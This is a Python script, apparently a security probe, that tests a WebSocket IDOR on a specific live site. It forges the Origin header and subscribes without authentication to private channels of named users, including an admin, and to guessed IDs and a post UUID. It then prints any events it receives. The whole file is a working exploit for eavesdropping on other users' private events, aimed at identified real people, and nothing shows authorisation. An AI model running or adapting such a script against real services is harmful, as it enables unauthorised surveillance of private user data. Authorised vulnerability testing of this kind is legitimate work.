#!/usr/bin/env python3
"""Verify the WebSocket user channel IDOR - can we listen to private user events?"""
import json
import time
import websocket

WS_URL = "wss://towers-pest-kelly-skins.trycloudflare.com/ws/"


def listen_to_user_channel(user_id):
    print(f"\n[*] Trying to subscribe to user.{user_id} without auth")
    ws = websocket.create_connection(
        WS_URL, origin="https://nebians.consica.com.np", timeout=10
    )

    ready = ws.recv()
    print(f"  Ready: {ready[:100]}")

    # Subscribe to the target user
    ws.send(json.dumps({"action": "subscribe", "channel": f"user.{user_id}"}))
    sub_resp = ws.recv()
    print(f"  Subscribe: {sub_resp}")

    if "subscribed" in sub_resp:
        print(f"  [!] CAN LISTEN TO USER {user_id} WITHOUT AUTH!")

        # Wait for any events
        print(f"  [*] Listening for events on user.{user_id} for 5 seconds...")
        ws.settimeout(5)
        events = []
        try:
            while True:
                msg = ws.recv()
                events.append(msg)
                print(f"  [EVENT] {msg[:200]}")
        except Exception:
            pass

        print(f"  Total events received: {len(events)}")

    ws.close()


# Test with known IDs from the site
print("=" * 60)
print("WebSocket User Channel IDOR Test")
print("=" * 60)

# testuser
listen_to_user_channel("testuser")
# Admin user (Nikit)
listen_to_user_channel("nikithamal")
# UUID we found
listen_to_user_channel("d0cfb9b0-d569-49f4-9f37-8383eccd5ff6")

# Try with random user IDs
print("\n[*] Testing arbitrary user IDs:")
for uid in ["randomuser123", "admin", "test", "1", "0", "nikit"]:
    ws = websocket.create_connection(
        WS_URL, origin="https://nebians.consica.com.np", timeout=5
    )
    ws.recv()  # ready
    ws.send(json.dumps({"action": "subscribe", "channel": f"user.{uid}"}))
    resp = ws.recv()
    print(f"  user.{uid} => {resp}")
    ws.close()

# Try IDOR on specific post - the welcome post
print("\n[*] Testing post channel - we know the post UUID b5833249-...")
ws = websocket.create_connection(
    WS_URL, origin="https://nebians.consica.com.np", timeout=10
)
ws.recv()
ws.send(json.dumps({"action": "subscribe", "channel": "post.b5833249-6585-4caa-84fa-a0d599f0cfc5"}))
print(f"  Subscribe: {ws.recv()}")
print("  Listening for events on the welcome post for 3 seconds...")
ws.settimeout(3)
try:
    while True:
        print(f"  [EVENT] {ws.recv()[:200]}")
except Exception:
    pass
ws.close()
